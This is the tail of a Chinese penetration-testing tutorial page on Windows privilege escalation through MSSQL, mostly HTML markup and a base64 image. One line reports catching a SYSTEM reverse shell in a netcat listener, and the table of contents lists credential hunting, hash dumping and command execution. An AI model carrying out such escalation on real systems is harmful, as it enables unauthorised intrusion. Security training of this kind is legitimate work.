DXRWPEtJLmH61RkAAADAEQ5bJfhJV7pzh3mex63sV7anx4f6ffzxYh/BXGv3VRGRJ1Lr1b8CH6x8cHiVj6tA6LwgIOJr/Le/hjcCAAAAjHAQbvq5w9zP4x5rvLPRLiC+BD8TYKj8ywDXXRmaf1xQccpbGHJJPIDs1XdCBR6RmRM5jGb6+Nt77wGAOVAiCgC4YzJ6WM8d5nQe92jWYTdRTAkh+n0FBwVeMXn4P+wZzY1xt9v9RPOTSOK0uQKLHns42VAWIQDwhRJRAMAd49Fj5NxhbudxK1rTdzgvjc3rV/SrsNwTvk7haepf3w2nfD5PFKs5VrFfWXnC12rTQ6az7mYssPaACQPBA5iJkehhPXeY13nc4y0JG91EQcHB64LXH7yWr/mHbCjjFlEzbqPncc84YO0BEwaCBzATtuhhO3eY73ncmPj8UtH+DJq+95RGewhCLjWiLHuwKjlU4H0sezbucVOMAMAFCB7ATFiih/XcYX7ncSNGKs6FuFlZWc21trYR+qw5fPe5RqD7S2/t9Xd3snd2Fq0+mFQ/q/ZJELD2gAkDwQOYySRHz1jfkKxHcxaoXNJRdCLINiCh5e/he9yw9oAJA8EDmMnkRo+qL3mr0+prmn/dgmHlp4Lsgr+Z4H/sn1nA2jPCj4fxwUH8mk+9BCAgeAAzmezo6apJ3BHoLhAKnV1dhF7+W+KfvJrov/KaWbyray/zV3XH/7byyg/US3pAuI3zrgYPYDEgeibIO7r2Wq/8NguEW/t0malPDsI3ihEAuMMcPb97/x8YoRR7l3lH195sEG5d69PlgEkI3yhGAOAOCPcEMWftaZQFaZ9OB3ECf2qllTmc+Tb/IFGApEF1P63U3YXzW1Kd7kYES/0Hf8Sv6rNRTRkTd+m9IguiBuSe9nYyupK/JpGrosmoQUMETINgdKBwtENEhjQmhl2mDdfUQ7hBMQIAd0C4J4g5a49BATXQVHJloE6wNKrHIHZqSBrKWj+pNj3aG016xVDAlHDTIGkuk9qqoQ0CA1zqYXpQaZle7SZ8oBgBgDsg3BPEnLVH1iO1gpDEhVFG9fpIyrWJZJmk47p8lla/YYauru2HpECthRA4Tl7pVZKUqtMxUpVWMXUu6SSYXoZWD0NnSV3TOKmvBy9DcVhfg6bX0wLhEsUIANyZauH+F2n7v7VqluWsxpy1p9cjnfzp00a6jJIkRq87TGkpXfS19dNlml4VF694C7e2mM6iE2UaeglmEG5NPfQynIV7WpWaAuESxQgA3Jki4UZ6/e/F2f97LBLF6y+3ro8MdlMKzDrMWXt6PdJlsrRMkKEMglGGaGJKV0m9cOsE14hws3vFW7hpzxID4dbXbwCDcGvqYRB30phQIHwmvTfoMOr8FEC4QTECAHcmV7j/eaDrL2X5/33mT/o18957fz4b197WIB/WnDA1xRApPy9+6HlNqQRB9IVi5AgXiWQog5htwk2XYAZRpsFPuE1LMykr16N/ZZl6CB8oRgDgzqQI9z8N9/ylsvi/Lp4lrRM9v4RuUl258Ofvbv9H5qOfs9N1/PXODSTxvPi/z7dRKp8M/vNmwtgI9d/9EJcoRo4wSCS7+BoIN01tGUvqLOYKN12mLSXc+tZ1ZRhEmeYSvYxOtUlPMmOQVJ48sFML4QDFCADcsbBwo3z2l5TbmoUxI/ltZcDPkft/PrTvpwN7OaJKSmhrrVOM9pF7StRGtnBHr0caAWJQEwYZxSElj4R0khSQ/uGkTgH5CTe7V3rhNiqUdAeoFlrrpF14hrvYhZsxmybAa+ZQwzRAOEAxAgB3LCzcCCRwY8+L/vWrs/+zYR0RoBR+Xr92KDZ66OTx0fg/Ki+cVX19QXUZZ/ibREl6Suej++0P7nGkMTO1pDi3uCCrIPcpd4oKs8pK8kqKc54VZXOk8kWxpEOslOtPWSH6ovuTF2SJNMRYHq2BpNQGkIpRVZK/cBui94raOkveTXeAZmHa39BCv8uI7LK7jQj8KZ9luDSdIuk+rQk+Fn4Q91KMAMAdyws3QimXdr5prHxeLE5NGT95/K/BqzRRTsTrvt2PHt7PfPLo6dO0vNwnz4pzykrzCV6UF1VXliCVrCgv4khlxbOaqrIq9V3cQeVf1ZTXVZfVVpVyRNzwEuttGx/TnEKu6Ythxzmi05pfD+sSWARJHxk0iwxV9XS5NgFNJfkJtxGvcPRJtznCjTDsxcorP+qc1HaZNgg04dY6Q6rWoJh6ZEg6S6B3m4soc7Hwg7iXYgQA7kyKcCNQctrX3dpYX/mirDAnK+P5nZuDx4/+EhSAx+ueiLS0+8WF2S/KCyueFyFNrK99rqPhVUWLuLqpoUpc/5IjzY1Vr5trW8Q1zY3V3Gltrm1rrXvdUsudrnbx8IBEpcC125y1p5dIQ8GdXmamV8ZheCDh6IV1ZvaF8I1iBADuTJZwI1ByOoB1dLQ1IG1FqXFB/tPHGQ8Kk5OqL51Hwl1WkiduqGxrqXvT+qr9dQOZzvZGSWdTVwdCzJHuzmb0nOiVtPR08aCv+7W0p40XqEfEZrc5aw+E22KwbRwRTCgdngII9yhGAODOJAo3AiWno0M9MukbJKwoKX5V+xxl2QV5mVlP05FwtzbVIOkcwNrpDMo6hwe6eDEy2C0f7uFP79hIHy+InW5z1h4It0Vh3i6fyb0gPKQYAYA7kyvcBCj1VoxKhwe6+5GCd7WgLLu+7kV1ZSkSblnfG7UUSpnA0I28IDYxpgZYe8CEgeABzGRKowcJK1JklIOjnBopeMebRiTclK/ZzRZg7QETBoIHMJPpiR6dgg8PdIFwA+8aEDyAmUxz9CAFH9d+wW52Qaw9AJgwlIgCAO5A9EwQyiIEAL5QIgoAuAPRAwAAMMsA4QYAAJhlgHADAADMMkC4AQAAZhkg3AAAALMMEG4AAIBZhbL//wGD1sjzxfNQHwAAAABJRU5ErkJggg==" width="488" height="62" class="img_ev3q"></p>
<p>执行命令 go 之后，可以看到提示符被挂起。当我们回到 netcat 监听器，便看到了一个 SYSTEM shell！</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250307161836149-1909697366-23d5b418c0900624f43e853343b6431f.png" width="504" height="183" class="img_ev3q"></p></div></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="文件选项卡"><a class="pagination-nav__link pagination-nav__link--prev" href="/web/docs/category/windows-提权"><div class="pagination-nav__sublabel">上一页</div><div class="pagination-nav__label">Windows 提权</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/web/docs/渗透/Windows 提权/Windows 提权-PrintNightmare"><div class="pagination-nav__sublabel">下一页</div><div class="pagination-nav__label">Windows 提权-PrintNightmare</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#导航" class="table-of-contents__link toc-highlight">导航</a></li><li><a href="#0前言" class="table-of-contents__link toc-highlight"><strong><div>0、前言</div></strong></a></li><li><a href="#1搜寻-mssql-服务" class="table-of-contents__link toc-highlight"><strong><div>1、搜寻 MSSQL 服务</div></strong></a></li><li><a href="#2场景一在数据库中查找凭证" class="table-of-contents__link toc-highlight"><strong><div>2、场景一：在数据库中查找凭证</div></strong></a></li><li><a href="#3场景二转储-mssql-服务账户的哈希" class="table-of-contents__link toc-highlight"><strong><div>3、场景二：转储 MSSQL 服务账户的哈希</div></strong></a></li><li><a href="#4场景三在-mssql-中执行-cmd-命令" class="table-of-contents__link toc-highlight"><strong><div>4、场景三：在 MSSQL 中执行 CMD 命令</div></strong></a></li></ul></div></div></div></div></main></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="footer__bottom text--center"><div class="margin-bottom--sm"><a href="https://www.cnblogs.com/kqdssheng" rel="noopener noreferrer" class="footerLogoLink_BH7S"><img src="/web/img/logo.svg" alt="博客园" class="footer__logo themedComponent_mlkZ themedComponent--light_NVdE" width="30" height="30"><img src="/web/img/logo.svg" alt="博客园" class="footer__logo themedComponent_mlkZ themedComponent--dark_xIcU" width="30" height="30"></a></div></div></div></footer></div>
</body>
</html>